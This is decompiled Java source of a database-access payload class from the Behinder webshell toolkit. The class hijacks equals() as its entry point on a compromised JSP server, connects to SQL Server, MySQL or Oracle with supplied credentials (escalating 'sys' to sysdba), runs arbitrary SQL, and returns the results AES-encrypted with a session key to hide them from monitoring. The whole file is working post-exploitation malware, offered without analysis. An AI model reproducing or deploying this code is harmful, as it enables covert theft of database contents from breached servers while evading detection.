// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.util.Iterator;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.List;
import java.sql.ResultSetMetaData;
import java.sql.ResultSet;
import java.sql.Statement;
import java.sql.Connection;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.sql.DriverManager;
import javax.servlet.ServletOutputStream;
import java.util.Map;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;

public class Database
{
    public static String type;
    public static String host;
    public static String port;
    public static String user;
    public static String pass;
    public static String database;
    public static String sql;
    private ServletResponse Response;
    private HttpSession Session;
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        final Map<String, String> result = new HashMap<String, String>();
        try {
            this.executeSQL();
            result.put("msg", this.executeSQL());
            result.put("status", "success");
        }
        catch (Exception e) {
            e.printStackTrace();
            result.put("status", "fail");
            if (e instanceof ClassNotFoundException) {
                result.put("msg", "NoDriver");
            }
            else {
                result.put("msg", e.getMessage());
            }
        }
        try {
            final ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
    
    public String executeSQL() throws Exception {
        String result = "[";
        String driver = null;
        String url = null;
        if (Database.type.equals("sqlserver")) {
            driver = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
            url = "jdbc:sqlserver://%s:%s;DatabaseName=%s";
        }
        else if (Database.type.equals("mysql")) {
            driver = "com.mysql.jdbc.Driver";
            url = "jdbc:mysql://%s:%s/%s";
        }
        else if (Database.type.equals("oracle")) {
            driver = "oracle.jdbc.driver.OracleDriver";
            url = "jdbc:oracle:thin:@%s:%s:%s";
            if (Database.user.equals("sys")) {
                Database.user += " as sysdba";
            }
        }
        url = String.format(url, Database.host, Database.port, Database.database);
        Class.forName(driver);
        final Connection con = DriverManager.getConnection(url, Database.user, Database.pass);
        final Statement statement = con.createStatement();
        final ResultSet rs = statement.executeQuery(Database.sql);
        final ResultSetMetaData metaData = rs.getMetaData();
        final int count = metaData.getColumnCount();
        final String[] colNames = new String[count];
        for (int i = 0; i < count; ++i) {
            colNames[i] = metaData.getColumnLabel(i + 1);
        }
        result += "[";
        for (final String col : colNames) {
            final String colRecord = String.format("{\"name\":\"%s\"}", col);
            result = result + colRecord + ",";
        }
        result = result.substring(0, result.length() - 1);
        result += "],";
        final Map<String, Object> record = new LinkedHashMap<String, Object>();
        final List<Map<String, Object>> recordList = new ArrayList<Map<String, Object>>();
        while (rs.next()) {
            result += "[";
            for (final String col2 : colNames) {
                record.put(col2, rs.getObject(col2));
                result = result + "\"" + rs.getObject(col2) + "\",";
            }
            recordList.add(record);
            result = result.substring(0, result.length() - 1);
            result += "],";
        }
        result = result.substring(0, result.length() - 1);
        result += "]";
        rs.close();
        con.close();
        return result;
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final String key = this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
}
